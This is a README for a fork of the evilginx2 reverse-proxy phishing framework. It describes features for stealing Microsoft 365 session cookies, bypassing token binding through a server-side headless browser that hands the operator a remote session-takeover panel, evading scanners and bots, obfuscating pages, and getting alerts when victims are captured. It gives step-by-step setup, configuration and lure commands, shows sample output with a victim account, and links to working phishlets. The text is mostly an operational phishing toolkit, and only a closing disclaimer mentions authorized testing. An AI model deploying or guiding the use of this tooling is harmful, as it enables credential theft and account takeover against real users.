# BenevolentGinx2 (Enhanced Community Edition)

Community-enhanced fork of [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) with **EvilPuppet**, REST API, Botguard, notifications, obfuscation, and more.

**Original work by Kuba Gretzky. Released under the same [BSD-3-Clause license](LICENSE).**

---

## What's New in This Fork

| Feature | Description |
|---------|-------------|
| **EvilPuppet** | Server-side headless browser that defeats Microsoft 365 Token Protection / Token Binding. Injects captured cookies into a Chromium instance on the server and gives you a web-based remote control panel — no cookie export needed. |
| REST API | Pull sessions, lures, phishlets, and config over HTTPS with an API key. |
| Botguard | Block scanners, bots, and headless browsers with UA heuristics, header checks, JA3 fingerprinting, and an optional JS challenge. |
| Notifications | Real-time alerts via Telegram, Slack, Webhooks, or Pushover when lures are clicked or sessions captured. |
| Obfuscation | JS variable renaming / string encoding / dead-code injection plus base64-wrapped HTML to evade content scanners. |
| Website Spoofing | Reverse-proxy a legitimate site for unauthorized visitors instead of redirecting them. |
| Named Proxies | Route traffic through per-phishlet or per-lure SOCKS5/HTTP proxies. |
| AES-256 Encryption | Encrypt lure URL parameters. |
| Multi-Domain | Assign different base domains to individual phishlets. |

---

## EvilPuppet — How It Works

Microsoft 365 now uses **Token Protection (Token Binding)** which ties session cookies to the TLS channel of the device that created them. Exporting cookies to your laptop and replaying them fails because the binding check doesn't match.

EvilPuppet solves this by keeping the session on the server:

1. Evilginx intercepts the victim's login and captures auth cookies as usual.
2. You run `puppet launch <session_id> <url>` — this starts a **headless Chromium** on the evilginx server itself.
3. The captured cookies are injected into that browser and it navigates to the target (e.g. Outlook, SharePoint).
4. Because the browser lives on the same machine that performed the MITM, **token binding checks pass**.
5. You open the puppet's **web control panel** in your own browser and remotely operate the authenticated session — click, type, scroll, navigate — as if you were sitting in front of it.

```
┌──────────┐       ┌───────────────────────────────────────┐       ┌──────────┐
│  Victim  │──────▶│            Evilginx Server            │──────▶│ Microsoft│
│ Browser  │ HTTPS │  ┌──────────┐   ┌──────────────────┐  │ HTTPS │   365    │
└──────────┘       │  │ MITM     │   │ EvilPuppet       │  │       └──────────┘
                   │  │ Proxy    │──▶│ Headless Chrome   │  │
                   │  │ (cookie  │   │ (injected cookies)│  │
                   │  │  capture)│   └────────┬─────────┘  │
                   │  └──────────┘            │ WebSocket   │
                   └──────────────────────────┼─────────────┘
                                              │
                                   ┌──────────▼──────────┐
                                   │   Your Browser      │
                                   │   (remote control)  │
                                   │   http://server:7777│
                                   └─────────────────────┘
```

### Puppet Commands

```
puppet                                     show active puppets
puppet launch <session_id> <target_url>    launch puppet for a captured session
puppet list                                list all puppets with status
puppet url <puppet_id>                     get the remote-control URL
puppet kill <puppet_id>                    stop a puppet
puppet kill all                            stop all puppets
puppet port <port>                         set web UI port (default 7777)
puppet password <password>                 set access password
puppet chrome <path>                       set Chromium executable path
```

### Example

```
: sessions
 id | phishlet | username            | password  | tokens   | remote ip    | time
----+----------+---------------------+-----------+----------+--------------+-----------
  5 | o365     | victim@company.com  | ******    | captured | 198.51.100.5 | 2025-02-13

: puppet launch 5 https://outlook.office.com
 [+] puppet #1 launched (id: 1)
     session:  5
     username: victim@company.com
     target:   https://outlook.office.com

: puppet url 1
     control: http://203.0.113.10:7777/puppet/1?key=a1b2c3d4e5f6...

  → Open that URL in your browser to take over the session.
```

---

## Quick Setup (Debian)

A single script installs Go, Chromium, builds the binary, and creates a systemd service:

```bash
git clone https://github.com/patrick-projects/BenevolentGinx2.git
cd BenevolentGinx2
chmod +x setup-debian.sh
sudo ./setup-debian.sh
```

The script handles:
- System packages (`build-essential`, `curl`, `wget`, etc.)
- Go 1.22+ (auto-detects amd64/arm64, skips if already present)
- Chromium (for EvilPuppet)
- Compiles the binary
- Installs to `/opt/evilginx` with a symlink at `/usr/local/bin/evilginx`
- Creates a systemd service (`evilginx.service`)
- Warns about firewall ports and conflicting services

After setup:

```bash
sudo evilginx                        # run interactively
# or
sudo systemctl start evilginx       # run as a service
sudo systemctl enable evilginx      # start on boot
```

### Manual Build

If you prefer to build manually:

```bash
sudo apt install -y build-essential golang-go chromium
# (Go must be 1.22+; install from https://go.dev/dl/ if apt version is too old)

git clone https://github.com/patrick-projects/BenevolentGinx2.git
cd BenevolentGinx2
make build
sudo ./build/evilginx -p ./phishlets
```

### Firewall Ports

| Port | Protocol | Purpose |
|------|----------|---------|
| 443 | TCP | HTTPS phishing proxy |
| 80 | TCP | HTTP redirect |
| 53 | UDP | DNS server |
| 7777 | TCP | EvilPuppet web control panel |

---

## Configuration

### First-Time Setup

```
config domain yourdomain.com
config ipv4 external 203.0.113.10
config unauth_url https://example.com
config autocert on
```

Point your DNS A records to the server, then enable phishlets.

### Phishlets

Drop `.yaml` phishlet files into the `phishlets/` directory:

```
phishlets hostname o365 login.yourdomain.com
phishlets enable o365
```

This repo only includes `phishlets/example.yaml`. Working phishlets for real sites come from the community:

- [An0nUD4Y/Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
- Search GitHub for `evilginx phishlets` for other collections

### Lures

```
lures create o365
lures get-url 0
```

### Sessions

```
sessions              # list all
sessions 5            # show details + cookies for session 5
```

---

## Optional Features

### Telegram Notifications

```
notify create mybot telegram
notify set mybot bot_token <TOKEN>
notify set mybot chat_id <CHAT_ID>
notify enable mybot
notify test mybot
```

Token from [@BotFather](https://t.me/BotFather). Chat ID from `https://api.telegram.org/bot<TOKEN>/getUpdates`.

### REST API

```
api key MySecretKey123
api secret_path /s3cr3t
api enable
```

Then: `curl -H "X-Api-Key: MySecretKey123" https://yourdomain.com/s3cr3t/api/sessions`

### Botguard

```
botguard enable
botguard js_challenge on
```

### Obfuscation

```
config obfuscation javascript high
config obfuscation html on
```

### Website Spoofing

```
config spoof on
config spoof_url https://example.com
```

---

## Quick Reference

| Goal | Command |
|------|---------|
| Help | `help` / `help <command>` |
| Config | `config` |
| Phishlets | `phishlets` / `phishlets enable <name>` / `phishlets hostname <name> <host>` |
| Lures | `lures` / `lures create <phishlet>` / `lures get-url <id>` |
| Sessions | `sessions` / `sessions <id>` |
| **EvilPuppet** | `puppet launch <sid> <url>` / `puppet url <id>` / `puppet list` / `puppet kill <id>` |
| Notifications | `notify create <name> <type>` / `notify test <name>` |
| API | `api key <key>` / `api enable` |
| Botguard | `botguard enable` / `botguard js_challenge on` |
| Proxy | `proxy create <name>` / `proxy set <name> type socks5h` |
| Blacklist | `blacklist unauth` / `blacklist off` |

---

## Disclaimer

This tool is for **authorized penetration testing only**. Use it only with explicit written permission from the target organization. Misuse is illegal and unethical.

---

## License

Copyright (c) 2018-2023 Kuba Gretzky. All rights reserved.
Redistribution and use in source and binary forms, with or without modification, are permitted under the terms of the [BSD-3-Clause license](LICENSE).
**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)). This fork retains the same license.
